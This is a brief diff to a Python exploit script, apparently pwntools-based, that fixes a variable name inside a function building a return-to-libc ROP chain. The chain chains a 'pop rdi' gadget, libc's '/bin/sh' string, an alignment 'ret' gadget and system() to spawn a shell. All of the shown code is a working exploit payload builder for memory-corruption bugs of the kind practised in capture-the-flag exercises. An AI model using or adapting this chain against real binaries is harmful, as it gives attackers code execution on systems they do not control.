@@ -128,7 +128,7 @@ def ret2libc_with_pie(libc_so, func_index, symbol,base_addr, libc_func,active_pr
 
 	payload = p64(active_process.address+rop.find_gadget(["pop rdi"])[0]) # pop rdi ; ret
 	payload += p64(next(libc.search(b'/bin/sh')))                         # /bin/sh for RDI
-	payload += p64(proc.address+rop.find_gadget(["ret"])[0])              # ret   :  for stack allignment
+	payload += p64(active_process.address+rop.find_gadget(["ret"])[0])              # ret   :  for stack allignment
 	payload += p64(libc.symbols[b'system'])                               # call system
 	payload += p64(0xdeadbeefcafebabe)                                    # system expects something to return to afterwards so we just put a dummy addr
 
